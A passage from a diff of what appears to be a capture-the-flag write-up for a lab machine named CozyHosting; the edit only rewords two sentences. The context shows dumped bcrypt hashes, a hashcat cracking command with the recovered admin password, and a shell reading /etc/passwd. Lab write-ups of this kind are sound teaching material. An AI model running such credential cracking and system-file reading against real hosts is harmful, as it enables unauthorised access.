@@ -432,11 +432,11 @@ cozyhosting=# select * from users;
 cozyhosting=# 
 </code></pre><pre tabindex="0"><code> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
  admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
-</code></pre><p>I was only able to crack the password hash for <code>admin</code>. We can test for password reuse.</p>
+</code></pre><p>I was only able to crack the password hash for <code>admin</code>, which doesn&rsquo;t provide much for directly, but we can test for password reuse.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
 └─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
-</code></pre><p>Looking at the users, <code>root</code>, <code>josh</code>, and <code>postgres</code> seem worth looking into.</p>
+</code></pre><p>Looking at system users, <code>root</code>, <code>josh</code>, and <code>postgres</code> seem worth looking into.</p>
 <pre tabindex="0"><code>app@cozyhosting:/app$ cat /etc/passwd | grep -v nologin | grep -v false
 root:x:0:0:root:/root:/bin/bash
 sync:x:4:65534:sync:/bin:/bin/sync
